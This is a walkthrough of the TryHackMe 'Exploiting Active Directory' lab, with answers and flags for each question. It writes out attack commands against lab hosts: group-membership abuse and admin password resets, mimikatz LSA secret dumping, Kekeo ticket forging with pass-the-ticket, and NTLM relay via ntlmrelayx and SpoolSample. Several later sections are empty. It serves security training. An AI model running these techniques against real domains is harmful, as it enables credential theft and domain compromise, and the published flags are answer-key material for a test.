![Exploiting Active Directory Banner](https://assets.tryhackme.com/room-banners/attacking-ad.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directory_Cover.png" alt="Exploiting Active Directory Logo">
</p>

# Exploiting Active Directory

This guide contains the answer and steps necessary to get to them for the [Exploiting Active Directory](https://tryhackme.com/room/exploitingad) room.

## Table of contents

- [Exploiting Permission Delegation](#exploiting-permission-delegation)
- [Exploiting Kerberos Delegation](#exploiting-kerberos-delegation)
- [Exploiting Automated Relays](#exploiting-automated-relays)
- [Exploiting AD Users](#exploiting-ad-users)
- [Exploiting GPOs](#exploiting-gpos)
- [Exploiting Certificates](#exploiting-certificates)
- [Exploiting Domain Trusts](#exploiting-domain-trusts)

### Exploiting Permission Delegation

1. Which ACE would allow you to update any non-protected parameter of a target object?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>GenericWrite</details>

2. What is the value of the flag stored on the Desktop of the Administrator user on THMWRK1 (flag1.txt)?
   
   First we should add our account to the "IT Support" group so we are able to change admin account passwords.

   ```cmd
   Add-ADGroupMember "IT Support" -Members "lorraine.gill"
   Get-ADGroupMember "IT Support"
   ```

   ![Permissions It](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Permissions_It.png)
   
   Next, we should look for a tier 2 admin account for which we will change its password.

   ```cmd
   Get-ADGroupMember -Identity "Tier 2 Admins"
   ```

   ![Permissions Tier 2](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Permissions_Tier_2.png)

   Setting a new password can be done with the following commands:

   ```cmd
   $Password = ConvertTo-SecureString "letmein1337" -AsPlainText -Force
   Set-ADAccountPassword -Identity "henry.shaw" -Reset -NewPassword $Password
   ```
   
   ![Permissions Set Password](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Permissions_Set_Password.png)

   Now we can remote into the workstation with our admin account.

   ![Permissions Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Permissions_Flag.png)

   ><details><summary>Click for answer</summary>THM{Permission.Delegation.FTW!}</details>

### Exploiting Kerberos Delegation

1. Which Kerberos Delegation type allows for delegation of all services?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Unconstrained Delegation</details>

2. Which Kerberos Delegation type allows the service to specify who is allowed to delegate to it?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>Resource-Based Constrained Delegation</details>

3. Which Constrained Delegation service allows access to the file system of the system via delegation?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>CIFS</details>

4. What is the value of the flag stored in the Desktop directory of the Administrator user on THMSERVER1 (flag2.txt)?

   Using `Import-Module C:\Tools\PowerView.ps1` and `Get-NetUser -TrustedToAuth`, we can see that `svcIIS` has delegate permissions.

   [Delegation Permissions](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Permissions.png)
   
   Make sure to be logged in to our t2 admin account and load mimikatz to dump the lsa secrets.

   ```cmd
   C:\Tools\mimikatz_trunk\x64\mimikatz.exe
   token::elevate
   lsadump::secrets
   ```

   ![Delegation Lsadump](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Lsadump.png)

   Now we can use `Kekeo` to generate a TGT for HTTP and WSMAN services.

   ```cmd
   C:\Tools\kekeo\x64\kekeo.exe
   tgt::ask /user:svcIIS /domain:za.tryhackme.loc /password:
   ```

   ![Delegation Tgt](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Tgt.png)

   Now that we have the TGT we can use it to forge TGS request for our svcIIS account. 

   ```cmd
   tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_duncan.moran /service:http/THMSERVER1.za.tryhackme.loc

   tgs::s4u /tgt:TGT_svcIIS@ZA.TRYHACKME.LOC_krbtgt~za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi /user:t1_duncan.moran /service:wsman/THMSERVER1.za.tryhackme.loc
   ```

   ![Delegation Tgs](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Tgs.png)

   In Mimikatz we set our token to default again and import the TGS tickets.

   ```cmd
   kerberos::ptt TGS_t1_duncan.moran@ZA.TRYHACKME.LOC_http~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi

   kerberos::ptt TGS_t1_duncan.moran@ZA.TRYHACKME.LOC_wsman~THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.kirbi
   ```

   ![Delegation Import](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Import.png)

   Last step is to now create a new PSSession and connect through it to thmserver1.

   ```
   New-PSSession -ComputerName thmserver1.za.tryhackme.loc
   Enter-PSSession -ComputerName thmserver1.za.tryhackme.loc
   ```

   ![Delegation Session](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Delegation_Session.png)

   Once we are on the server we can find our flag.

   ><details><summary>Click for answer</summary>THM{Constrained.Delegation.Can.Be.Very.Bad}</details>

### Exploiting Automated Relays

1. How often (in days) are the passwords of Windows machine accounts rotated by default?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>30</details>

2. What should not be enforced if we want to relay an SMB authentication attempt?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>SMB Signing</details>

3. What is the value of the flag stored in the Desktop directory of the Administrator.ZA user on THMSERVER1 (flag3.txt)?

   First, we should setup the relay on our attackbox.

   ```cmd
   python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py -smb2support -t smb://"10.200.60.201" -debug
   ```
   
   ![Relay Setup](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Relay_Setup.png)

   Now we create a request from the workstation.
   
   ```cmd
   C:\Tools\SpoolSample.exe THMSERVER2.za.tryhackme.loc "10.50.57.135"
   ```
   
   ![Relay Request](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Relay_Request.png)

   We receive a hash dump from thmserver1 which we can use to login and get the flag. 

   ![Relay Credentials](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Relay_Credentials.png)

   In this case, I will use the previously gained access to get the flag.

   ![Relay Flag3](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/exploitingad/Exploiting_Active_Directoy_Relay_Flag3.png)

   ><details><summary>Click for answer</summary>THM{Printing.Some.Shellz}</details>

### Exploiting AD Users

1. What application is used to open the kdbx credential database?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>keepass</details>

2. What meterpreter command do we use to move from SYSTEM to user context?

   The answer can be found in the text.

   ><details><summary>Click for answer</summary>migrate</details>

3. What is the password of the credential database?



   ><details><summary>Click for answer</summary></details>

4. What is the value of the flag stored in the credential database?



   ><details><summary>Click for answer</summary></details>

### Exploiting GPOs

1. What object allows users to configure Windows policies?



   ><details><summary>Click for answer</summary></details>

2. What AD feature allows us to configure GPOs for the entire AD structure?



   ><details><summary>Click for answer</summary></details>

3. What is the name of the GPO that our compromised AD account owns?



   ><details><summary>Click for answer</summary></details>

4. What is the value of the flag stored on THMSERVER2 in the Administrator's Desktop directory (flag4.txt)?



   ><details><summary>Click for answer</summary></details>

### Exploiting Certificates

1. What does the user create to ask the CA for a certificate?



   ><details><summary>Click for answer</summary></details>

2. What is the name of Microsoft's PKI implementation?



   ><details><summary>Click for answer</summary></details>

3. What is the value of the flag stored on THMDC in the Administrator's Desktop directory (flag5.txt)?



   ><details><summary>Click for answer</summary></details>

### Exploiting Domain Trusts

1. What domain trust relationship is by default configured between a parent and a child domain?



   ><details><summary>Click for answer</summary></details>

2. What is the name of the AD account used by the KDC to encrypt and sign TGTs?



   ><details><summary>Click for answer</summary></details>

3. What is the name of the TGT that grants access to resources outside of our current domain?



   ><details><summary>Click for answer</summary></details>

4. What is the value of the flag stored on THMROOTDC in the Administrator's Desktop folder (flag6.txt)?



   ><details><summary>Click for answer</summary></details>

